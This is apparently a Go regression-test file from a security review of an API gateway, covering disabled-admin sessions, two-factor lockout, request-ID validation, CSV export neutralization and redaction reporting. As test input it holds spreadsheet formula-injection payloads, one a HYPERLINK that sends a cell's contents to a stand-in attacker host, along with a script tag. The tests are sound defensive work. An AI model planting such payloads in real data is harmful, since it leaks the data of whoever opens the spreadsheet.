package httpapi

import (
	"bytes"
	"context"
	"encoding/csv"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/torvanis/janus/internal/auth"
	"github.com/torvanis/janus/internal/store"
)

// Regression tests for the 2026-11 security review, batch 1. Each test names
// the behavior that was wrong and fails on the code before the fix.

// A disabled administrator must lose the admin API at once: the open browser
// session ends with the account, and a session that somehow outlives it is
// refused by the admin guard (which used to check the role but not whether
// the account was still active, so the person could re-enable themselves).
func TestDisabledAdminLosesAdminAccess(t *testing.T) {
	h := newHarness(t)
	ctx := context.Background()
	a, _, err := h.store.UpsertUserFromIdentity(ctx, "sub-admin-a", "admin-a@example.com", "Admin A", true, false)
	if err != nil {
		t.Fatal(err)
	}
	b, _, err := h.store.UpsertUserFromIdentity(ctx, "sub-admin-b", "admin-b@example.com", "Admin B", true, false)
	if err != nil {
		t.Fatal(err)
	}
	sa, err := h.server.Sessions.Create(ctx, a.ID)
	if err != nil {
		t.Fatal(err)
	}
	sb, err := h.server.Sessions.Create(ctx, b.ID)
	if err != nil {
		t.Fatal(err)
	}
	if rec := h.doAsSession(sb, http.MethodGet, "/api/v1/admin/users", nil); rec.Code != http.StatusOK {
		t.Fatalf("baseline: an active admin lists users, got %d %s", rec.Code, rec.Body.String())
	}

	if rec := h.doAsSession(sa, http.MethodPatch, "/api/v1/admin/users/"+b.ID, map[string]any{"is_active": false}); rec.Code != http.StatusOK {
		t.Fatalf("disable: %d %s", rec.Code, rec.Body.String())
	}
	// The session that was open when the account was disabled is gone.
	if _, err := h.server.Sessions.Get(ctx, sb.ID); err == nil {
		t.Fatal("disabling an account must end its browser sessions")
	}
	if rec := h.doAsSession(sb, http.MethodGet, "/api/v1/admin/users", nil); rec.Code != http.StatusUnauthorized {
		t.Fatalf("ended session on an admin route: got %d, want 401", rec.Code)
	}

	// A session that exists for a disabled admin anyway (restored row, a
	// replica that missed the delete) carries no admin authority.
	stale, err := h.server.Sessions.Create(ctx, b.ID)
	if err != nil {
		t.Fatal(err)
	}
	if rec := h.doAsSession(stale, http.MethodGet, "/api/v1/admin/users", nil); rec.Code != http.StatusForbidden {
		t.Fatalf("disabled admin with a live session listed users: %d %s", rec.Code, rec.Body.String())
	}
	if rec := h.doAsSession(stale, http.MethodPatch, "/api/v1/admin/users/"+b.ID, map[string]any{"is_active": true}); rec.Code != http.StatusForbidden {
		t.Fatalf("disabled admin re-enabled their own account: %d %s", rec.Code, rec.Body.String())
	}
	if after, _ := h.store.UserByID(ctx, b.ID); after == nil || after.IsActive {
		t.Fatal("the account must still be disabled")
	}
	// The model list on the proxy surface accepts a session too.
	req := httptest.NewRequest(http.MethodGet, "/v1/models", nil)
	req.AddCookie(&http.Cookie{Name: auth.SessionCookie, Value: stale.ID})
	rec := httptest.NewRecorder()
	h.handler.ServeHTTP(rec, req)
	if rec.Code == http.StatusOK {
		t.Fatalf("disabled person listed models with a session: %s", rec.Body.String())
	}
}

// Deleting an account ends its sessions as well, so restoring it within the
// hold does not bring a pre-deletion session back to life.
func TestDeletedUserSessionsEnd(t *testing.T) {
	h := newHarness(t)
	ctx := context.Background()
	a, _, err := h.store.UpsertUserFromIdentity(ctx, "sub-admin-a", "admin-a@example.com", "Admin A", true, false)
	if err != nil {
		t.Fatal(err)
	}
	sa, _ := h.server.Sessions.Create(ctx, a.ID)
	victim := h.sessionFor(t, "leaver@example.com")
	if rec := h.doAsSession(sa, http.MethodDelete, "/api/v1/admin/users/"+victim.UserID, nil); rec.Code != http.StatusOK {
		t.Fatalf("delete: %d %s", rec.Code, rec.Body.String())
	}
	if _, err := h.server.Sessions.Get(ctx, victim.ID); err == nil {
		t.Fatal("deleting an account must end its browser sessions")
	}
}

// enrollTOTP signs a local user in and turns two-factor on, returning the
// session cookies and the authenticator secret.
func enrollTOTP(t *testing.T, h *harness, email, password string) ([]*http.Cookie, string) {
	t.Helper()
	if _, err := h.store.CreateLocalUser(t.Context(), email, "Local User", password, false); err != nil {
		t.Fatal(err)
	}
	ok := h.jsonPost("/auth/local/login", map[string]any{"email": email, "password": password}, nil)
	if ok.Code != http.StatusOK {
		t.Fatalf("login: %d %s", ok.Code, ok.Body.String())
	}
	cookies := ok.Result().Cookies()
	start := h.withSession(http.MethodPost, "/api/v1/me/local/totp/start", map[string]any{}, cookies)
	if start.Code != http.StatusOK {
		t.Fatalf("first enrollment needs no password: %d %s", start.Code, start.Body.String())
	}
	secret := decode(t, start)["secret"].(string)
	if r := h.withSession(http.MethodPost, "/api/v1/me/local/totp/confirm", map[string]any{"code": totpCode(secret)}, cookies); r.Code != http.StatusOK {
		t.Fatalf("confirm: %d %s", r.Code, r.Body.String())
	}
	return cookies, secret
}

// "Start enrollment" on an account that already has two-factor replaces the
// stored secret, which turned the second factor off with no password and no
// audit record. It is now held to the same bar as turning it off.
func TestTOTPStartCannotDropAnEnabledSecondFactor(t *testing.T) {
	h := newHarness(t)
	const email, password = "carol@example.com", "carol-password-12"
	cookies, _ := enrollTOTP(t, h, email, password)

	for _, body := range []map[string]any{{}, {"password": "not-the-password-1"}} {
		if r := h.withSession(http.MethodPost, "/api/v1/me/local/totp/start", body, cookies); r.Code != http.StatusForbidden {
			t.Fatalf("start on an enabled account with body %v: %d %s", body, r.Code, r.Body.String())
		}
	}
	if m := decode(t, h.withSession(http.MethodGet, "/api/v1/me/local", nil, cookies)); m["totp_enabled"] != true {
		t.Fatalf("two-factor must still be on after refused starts: %v", m)
	}
	step1 := h.jsonPost("/auth/local/login", map[string]any{"email": email, "password": password}, nil)
	if decode(t, step1)["totp_required"] != true {
		t.Fatalf("sign-in must still ask for the code: %s", step1.Body.String())
	}

	// With the password it works, and the removal is on the audit trail.
	if r := h.withSession(http.MethodPost, "/api/v1/me/local/totp/start", map[string]any{"password": password}, cookies); r.Code != http.StatusOK {
		t.Fatalf("start with the password: %d %s", r.Code, r.Body.String())
	}
	entries, _, err := h.store.ListAudit(t.Context(), store.AuditFilter{Action: "user_totp_disabled", Limit: 10})
	if err != nil || len(entries) != 1 {
		t.Fatalf("setting two-factor up again must be audited as a removal: %d entries, err %v", len(entries), err)
	}
}

// A correct password used to clear the failure count before the code step,
// and the code step never checked the lock, so codes could be guessed five
// at a time forever. Wrong codes now add up across password steps and lock
// the account like wrong passwords do.
func TestTOTPGuessesLockTheAccount(t *testing.T) {
	h := newHarness(t)
	const email, password = "dave@example.com", "dave-password-12"
	_, secret := enrollTOTP(t, h, email, password)
	max := h.store.SecurityPolicy(t.Context()).Lockout.MaxFailures
	if max <= 0 {
		t.Skip("lockout is off in the default policy")
	}

	locked := false
	for i := 0; i < max+2 && !locked; i++ {
		step1 := h.jsonPost("/auth/local/login", map[string]any{"email": email, "password": password}, nil)
		if step1.Code == http.StatusLocked {
			locked = true
			break
		}
		if step1.Code != http.StatusOK {
			t.Fatalf("password step %d: %d %s", i, step1.Code, step1.Body.String())
		}
		pending := decode(t, step1)["pending"].(string)
		// One wrong code per password step: before the fix every password
		// step reset the count, so this loop never locked.
		r := h.jsonPost("/auth/local/totp", map[string]any{"pending": pending, "code": "000000"}, nil)
		switch r.Code {
		case http.StatusUnauthorized:
		case http.StatusLocked:
			locked = true
		default:
			t.Fatalf("wrong code %d: %d %s", i, r.Code, r.Body.String())
		}
	}
	if !locked {
		t.Fatalf("%d wrong codes did not lock the account", max+2)
	}
	// Locked means locked for the code step too, even with the right code
	// on a prompt issued before the lock.
	if r := h.jsonPost("/auth/local/login", map[string]any{"email": email, "password": password}, nil); r.Code != http.StatusLocked {
		t.Fatalf("password step on a locked account: %d", r.Code)
	}
	_ = secret
}

// A full sign-in (password and code) still starts the count over.
func TestTOTPSuccessClearsFailures(t *testing.T) {
	h := newHarness(t)
	const email, password = "erin@example.com", "erin-password-12"
	_, secret := enrollTOTP(t, h, email, password)
	for i := 0; i < 2; i++ {
		step1 := h.jsonPost("/auth/local/login", map[string]any{"email": email, "password": password}, nil)
		pending := decode(t, step1)["pending"].(string)
		h.jsonPost("/auth/local/totp", map[string]any{"pending": pending, "code": "000000"}, nil)
	}
	step1 := h.jsonPost("/auth/local/login", map[string]any{"email": email, "password": password}, nil)
	pending := decode(t, step1)["pending"].(string)
	if r := h.jsonPost("/auth/local/totp", map[string]any{"pending": pending, "code": totpCode(secret)}, nil); r.Code != http.StatusOK {
		t.Fatalf("right code: %d %s", r.Code, r.Body.String())
	}
	if locked, _ := h.store.SignInLocked(t.Context(), email); locked {
		t.Fatal("account locked after a successful sign-in")
	}
	// Had the two earlier failures stayed, these would reach the limit.
	max := h.store.SecurityPolicy(t.Context()).Lockout.MaxFailures
	for i := 0; i < max-1; i++ {
		step1 := h.jsonPost("/auth/local/login", map[string]any{"email": email, "password": password}, nil)
		if step1.Code != http.StatusOK {
			t.Fatalf("failures were not cleared by the full sign-in: locked after %d more wrong codes (%d)", i, step1.Code)
		}
		pending := decode(t, step1)["pending"].(string)
		h.jsonPost("/auth/local/totp", map[string]any{"pending": pending, "code": "000000"}, nil)
	}
	if locked, _ := h.store.SignInLocked(t.Context(), email); locked {
		t.Fatal("failures were not cleared by the full sign-in")
	}
}

// A caller-supplied request id is stored, indexed, logged and exported, so
// only a short plain token is accepted; anything else is replaced.
func TestRequestIDFromCallerIsValidated(t *testing.T) {
	h := newHarness(t)
	for _, tc := range []struct {
		sent string
		kept bool
	}{
		{"trace-1234.abc_DEF:9", true},
		{"0f8fad5b-d9cb-469f-a165-70867728950e", true},
		{`=HYPERLINK("https://evil.example/?"&B2,"x")`, false},
		{"has space", false},
		{"semi;colon", false},
		{strings.Repeat("a", 129), false},
		{"bad\xffbyte", false},
	} {
		req := httptest.NewRequest(http.MethodGet, "/healthz", nil)
		req.Header.Set("X-Janus-Request-ID", tc.sent)
		rec := httptest.NewRecorder()
		h.handler.ServeHTTP(rec, req)
		got := rec.Header().Get("X-Janus-Request-ID")
		if tc.kept && got != tc.sent {
			t.Errorf("valid id %q was replaced by %q", tc.sent, got)
		}
		if !tc.kept && (got == tc.sent || got == "" || !validRequestID(got)) {
			t.Errorf("invalid id %q: response carries %q", tc.sent, got)
		}
	}
}

// The request-log export wrote caller-chosen text into cells as is. Every
// text cell is now neutralized, so a spreadsheet shows it instead of running it.
func TestRequestExportNeutralizesFormulas(t *testing.T) {
	h := newHarness(t)
	ctx := context.Background()
	if err := h.store.InsertUsageEvent(ctx, &store.UsageEvent{
		ID: store.NewID(), CreatedAt: time.Now().UTC(), UserID: h.user.ID,
		ModelName: "@SUM(1+1)", RequestedModelName: "+cmd", EndpointPath: "/v1/chat/completions", HTTPMethod: "POST",
		Modality: "chat", HTTPStatus: 403, ErrorCode: "-2+3", RequestID: `=HYPERLINK("https://evil.example","x")`,
	}); err != nil {
		t.Fatal(err)
	}
	sess, err := h.server.Sessions.Create(ctx, h.user.ID)
	if err != nil {
		t.Fatal(err)
	}
	rec := h.doAsSession(sess, http.MethodGet, "/api/v1/requests.csv", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("export: %d %s", rec.Code, rec.Body.String())
	}
	rows, err := csv.NewReader(strings.NewReader(rec.Body.String())).ReadAll()
	if err != nil || len(rows) < 2 {
		t.Fatalf("parse export: %v rows=%d", err, len(rows))
	}
	seen := false
	for _, row := range rows[1:] {
		for i, cell := range row {
			if cell != "" && strings.ContainsRune("=+-@", rune(cell[0])) {
				t.Errorf("column %q holds a live formula: %q", rows[0][i], cell)
			}
			if strings.Contains(cell, "HYPERLINK") {
				seen = true
			}
		}
	}
	if !seen {
		t.Fatal("the seeded row is missing from the export")
	}
}

func TestCSVSafe(t *testing.T) {
	for in, want := range map[string]string{
		"plain": "plain", "": "", "a=b": "a=b",
		"=1+1": "'=1+1", "+1": "'+1", "-1": "'-1", "@x": "'@x",
		"  =1+1": "'  =1+1", "\t=1": "'\t=1", "\rx": "'\rx",
		"'=already": "'=already",
	} {
		if got := csvSafe(in); got != want {
			t.Errorf("csvSafe(%q) = %q, want %q", in, got, want)
		}
	}
}

// truncate is applied to header values before they are stored: it must never
// cut a character in half or let an invalid byte through.
func TestTruncateKeepsTextStorable(t *testing.T) {
	if got := truncate("héllo", 2); got != "h" {
		t.Errorf("cut inside a character: %q", got)
	}
	if got := truncate("a\xffb", 10); got != "a\uFFFDb" {
		t.Errorf("invalid byte kept: %q", got)
	}
	if got := truncate("short", 10); got != "short" {
		t.Errorf("short value changed: %q", got)
	}
}

// Documentation feedback is the one write open to a signed-out reader. It
// took a page field of any size (megabytes per row) at any rate.
func TestDocsFeedbackIsBounded(t *testing.T) {
	h := newHarness(t)
	post := func(body map[string]any) int {
		return h.jsonPost("/api/v1/docs/feedback", body, nil).Code
	}
	if c := post(map[string]any{"page": "getting-started", "helpful": true, "note": "thanks"}); c != http.StatusAccepted {
		t.Fatalf("ordinary feedback: %d", c)
	}
	if c := post(map[string]any{"page": "api/errors", "helpful": false}); c != http.StatusAccepted {
		t.Fatalf("nested page: %d", c)
	}
	for _, page := range []string{"", strings.Repeat("a", 201), "<script>", strings.Repeat("x", 1<<20)} {
		if c := post(map[string]any{"page": page, "helpful": true}); c != http.StatusBadRequest {
			t.Errorf("page of %d bytes (%.20q): got %d, want 400", len(page), page, c)
		}
	}
}

func TestDocsFeedbackIsRateLimited(t *testing.T) {
	h := newHarness(t)
	post := func(body map[string]any) int {
		return h.jsonPost("/api/v1/docs/feedback", body, nil).Code
	}
	// One address is held to a few posts a minute.
	limited := false
	for i := 0; i < docsFeedbackPerAddressPerMin+2; i++ {
		if post(map[string]any{"page": "glossary", "helpful": true}) == http.StatusTooManyRequests {
			limited = true
		}
	}
	if !limited {
		t.Fatal("no rate limit on anonymous feedback")
	}
}

// An update that does not mention capture used to store "no value", which
// reads as on: flagged prompts and replies were then kept in full while the
// editor showed the switch off. The stored setting now survives the update,
// and the audit record shows it.
func TestSecgwPolicyUpdateKeepsCaptureSetting(t *testing.T) {
	h := newHarness(t)
	ctx := context.Background()
	admin, _, err := h.store.UpsertUserFromIdentity(ctx, "sub-admin-a", "admin-a@example.com", "Admin A", true, false)
	if err != nil {
		t.Fatal(err)
	}
	sess, _ := h.server.Sessions.Create(ctx, admin.ID)
	create := h.doAsSession(sess, http.MethodPost, "/api/v1/admin/secgw/policies", map[string]any{
		"name": "watch", "enabled": true,
		"checks": []map[string]any{{"kind": store.SecgwCheckSecrets, "enabled": true, "mode": store.SecgwModeObserve}},
	})
	if create.Code != http.StatusCreated {
		t.Fatalf("create: %d %s", create.Code, create.Body.String())
	}
	id := decode(t, create)["policy"].(map[string]any)["id"].(string)
	stored, err := h.store.SecgwPolicyByID(ctx, id)
	if err != nil || stored.Capture.PromptInjectionBodiesEnabled() {
		t.Fatalf("a new policy keeps no flagged messages: enabled=%v err=%v", stored != nil && stored.Capture.PromptInjectionBodiesEnabled(), err)
	}

	update := h.doAsSession(sess, http.MethodPut, "/api/v1/admin/secgw/policies/"+id, map[string]any{
		"name": "watch renamed", "enabled": true,
		"checks": []map[string]any{{"kind": store.SecgwCheckSecrets, "enabled": true, "mode": store.SecgwModeObserve}},
	})
	if update.Code != http.StatusOK {
		t.Fatalf("update: %d %s", update.Code, update.Body.String())
	}
	stored, err = h.store.SecgwPolicyByID(ctx, id)
	if err != nil {
		t.Fatal(err)
	}
	if stored.Name != "watch renamed" {
		t.Fatalf("update not applied: %q", stored.Name)
	}
	if stored.Capture.PromptInjectionBodiesEnabled() {
		t.Fatal("an update that omitted capture switched the keeping of flagged messages on")
	}

	// Turning it on is still possible, and shows in the audit record.
	on := h.doAsSession(sess, http.MethodPut, "/api/v1/admin/secgw/policies/"+id, map[string]any{
		"name": "watch renamed", "enabled": true, "capture": map[string]any{"prompt_injection_bodies": true},
		"checks": []map[string]any{{"kind": store.SecgwCheckSecrets, "enabled": true, "mode": store.SecgwModeObserve}},
	})
	if on.Code != http.StatusOK {
		t.Fatalf("turn capture on: %d %s", on.Code, on.Body.String())
	}
	entries, _, err := h.store.ListAudit(ctx, store.AuditFilter{Action: "secgw_policy_updated", Limit: 10})
	if err != nil || len(entries) == 0 {
		t.Fatalf("audit: %d entries, err %v", len(entries), err)
	}
	found := false
	for _, e := range entries {
		if strings.Contains(e.NewValue, `"capture_flagged_messages":true`) && strings.Contains(e.OldValue, `"capture_flagged_messages":false`) {
			found = true
		}
	}
	if !found {
		t.Fatalf("the capture change is not in the audit record: %+v", entries[0])
	}
}

// A redact-mode check that matches in a body the gateway cannot rewrite (one
// that is not JSON: an upload) forwards the original bytes. It used to
// record the match as "redacted" and announce a redaction count anyway.
func TestSecgwDoesNotClaimRedactionItDidNotApply(t *testing.T) {
	h := newHarness(t)
	h.secgwPolicy(t, store.SecgwPolicy{Name: "redact", Enabled: true, Checks: []store.SecgwCheck{
		{Kind: store.SecgwCheckSecrets, Enabled: true, Mode: store.SecgwModeRedact},
	}})
	ct, form := multipartBody(t, [][2]string{{"model", "test-model"}, {"prompt", "key " + testAWSKey + " end"}, {"file", ""}}, 16)
	req := httptest.NewRequest(http.MethodPost, "/v1/audio/transcriptions", bytes.NewReader(form))
	req.Header.Set("Content-Type", ct)
	req.Header.Set("Authorization", "Bearer "+h.token)
	rec := httptest.NewRecorder()
	h.handler.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("transcription: %d %s", rec.Code, rec.Body.String())
	}
	if sent := string(h.upstreamRequests[len(h.upstreamRequests)-1].Body); !strings.Contains(sent, testAWSKey) {
		t.Fatal("the upload was rewritten; this test expects a body that cannot be")
	}
	if got := rec.Header().Get(headerRedactions); got != "" {
		t.Errorf("response announces %s redactions, but the key went to the provider", got)
	}
	if got := rec.Header().Get(headerSecgwAction); got == store.SecgwActionRedacted {
		t.Errorf("response says %q, but nothing was removed", got)
	}
	vs := h.waitForViolations(t, 1)
	if len(vs) != 1 {
		t.Fatalf("want 1 violation, got %d", len(vs))
	}
	if vs[0].Action != store.SecgwActionObserved {
		t.Errorf("violation recorded as %q; the match was seen, not removed", vs[0].Action)
	}
}
